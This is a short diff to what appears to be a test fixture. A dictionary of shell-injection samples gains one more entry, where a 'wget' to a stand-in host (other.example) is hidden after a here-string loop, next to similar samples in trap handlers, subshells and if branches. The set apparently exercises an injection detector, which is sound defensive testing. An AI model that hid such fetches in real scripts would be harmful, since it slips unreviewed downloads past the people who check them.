@@ -418,6 +418,7 @@ INJECTIONS = {
     "an if branch": "\nif true; then wget https://other.example/x; fi\n",
     "a trap handler": "\ntrap 'wget https://other.example/x' EXIT\n",
     "after a here-document": "\ncat <<EOF\nbody\nEOF\nwget https://other.example/x\n",
+    "after a here-string": '\nwhile read -r r; do :; done <<< "$x"\nwget https://other.example/x\n',
     "a subshell": "\n(wget https://other.example/x)\n",
 }
 
